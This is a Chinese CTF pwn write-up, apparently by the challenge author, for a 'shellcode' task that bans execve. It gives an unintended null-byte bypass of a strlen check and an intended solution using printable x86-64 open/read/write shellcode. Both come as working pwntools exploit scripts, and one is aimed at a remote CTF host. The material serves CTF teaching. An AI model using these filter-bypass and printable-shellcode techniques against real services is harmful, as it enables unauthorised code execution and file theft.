## shellcode
### 非预期
粗心的出题人要哭死了，我应该用strdup的！
对输入进行检测的地方用strlen获取shellcode的长度，可以用0截断绕过，然后就orw shellcode一把梭了(干！)

```python
from pwn import *
context.log_level = 'debug'

shellcode='''
push 0x67616c66
mov rdi,rsp 
mov rax, 2
xor rsi,rsi
mov rdx,40
syscall
mov rdi,rax
mov rsi,rsp
xor rax,rax
syscall
mov rdi, 1
mov rax, 1
syscall
'''

shellcode = '\x3c\x00'+asm(shellcode,arch='amd64',os='linux')
p = process('./shellcode')
p.sendline(shellcode)
p.interactive()
```
### 原预期
考查可打印shellcode的编写，程序禁用了execve所以只能写open,read,write来读取flag
可能使用alpha3生成，也可以自己编写，可用到的汇编指令如下：
```
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```
exp:
```python
#coding:utf-8
from pwn import *
context.log_level = 'debug'
# p = process('./shellcode')
p = remote("183.129.189.60","10033")
#内存地址随机化
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        print "breakpoint_addr --> " + hex(text_base + 0x202040)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr))) 
sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

# ru("name:\n")
pay = '''
/*fp = open("flag")*/
push 0x67616c66
push rsp
pop rdi
push rax
pop rax
push 0x5c
pop rcx
xor byte ptr[rax+0x25],cl
push 0x5e
pop rcx
xor byte ptr[rax+0x26],cl
push rax
pop rbx
push 0x50
pop rax
xor al,0x50
push rax
pop rsi
push rax
pop rdx
push 0x40
pop rax
xor al,0x42
push rbx
pop rbx
push rbx

/*read(fp,buf,0x30)*/
push rax
pop rdi
push rsp 
pop rsi
push 0x30
pop rdx
push rbx
pop rax
push 0x5c
pop rcx
xor byte ptr[rax+0x42],cl
push 0x5e
pop rcx
xor byte ptr[rax+0x43],cl
push 0x40
pop rax
xor al,0x40
push rbx
pop rbx

/*write(1,buf,0x30)*/
push 0x40
pop rax
xor al,0x41
push rax
pop rdi
push rbx
pop rax
push 0x5c
pop rcx
xor byte ptr[rax+0x5b],cl
push 0x5e
pop rcx
xor byte ptr[rax+0x5c],cl
push rdi
pop rax
push rbx
pop rbx
push rbx
pop rbx
push rbx
pop rbx
'''
# 0f05
pay = asm(pay,arch = 'amd64',os = 'linux')
# pay = 'PZTAYAXVI31VXPP[_Hc4:14:SX-@(t3-P `_58</_P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-q;@A-pE A5Wp09P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-$Ht -_`l 5O_W6P^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-@"3@-A`  5{G/XP^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-@&Fa-P" A5x4_MP^14:WX-~[w_-?ah,-?C tP_Hc4:14:SX-  " - @~@5E_*wP^14:WX-~[w_-?ah,-?C tP_SX- H#B- x^~5X>~?P_Hc4:14:SX-"*  -E6  5f}//P^14:WX-~[w_-?ah,-?C tP_SX- A""- ?~~5\\~__P^SX-@@@"-y``~5____P_AAAA_tRs)!(No,).7"21K 8vF D=yO~H,,OD?Erp-olv]7X\'~{z$'
# debug(0xabd)
sd(pay)
p.interactive()
```